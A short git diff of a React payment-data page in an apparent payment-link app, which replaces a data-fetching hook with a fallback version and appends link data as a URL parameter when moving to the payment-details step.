@@ -9,7 +9,8 @@ import { getCountryByCode } from "@/lib/countries";
 import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
 import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
-import { useLink, useUpdateLink } from "@/hooks/useSupabase";
+import { useUpdateLink } from "@/hooks/useSupabase";
+import { useLinkWithFallback, appendDataParam } from "@/hooks/useLinkWithFallback";
 import { ArrowLeft, User, Mail, Phone, CreditCard, Hash, Building2 } from "lucide-react";
 import BrandedTopBar from "@/components/BrandedTopBar";
 import BrandedCarousel from "@/components/BrandedCarousel";
@@ -21,7 +22,7 @@ import PageLoader from "@/components/PageLoader";
 const PaymentData = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData, isLoading } = useLink(id);
+  const { data: linkData, isLoading } = useLinkWithFallback(id);
   const updateLink = useUpdateLink();
   const [isSubmitting, setIsSubmitting] = useState(false);
 
@@ -127,7 +128,7 @@ const PaymentData = () => {
 
       // Navigate to payment details with params
       const finalAmount = parseFloat(paymentAmount) || amount;
-      const nextUrl = `/pay/${id}/details?company=${serviceKey}&currency=${getCurrencyCode(countryCode)}&amount=${finalAmount}`;
+      const nextUrl = appendDataParam(`/pay/${id}/details?company=${serviceKey}&currency=${getCurrencyCode(countryCode)}&amount=${finalAmount}`, linkData);
       navigate(nextUrl);
     } catch (error) {
       console.error('Payment data error:', error);
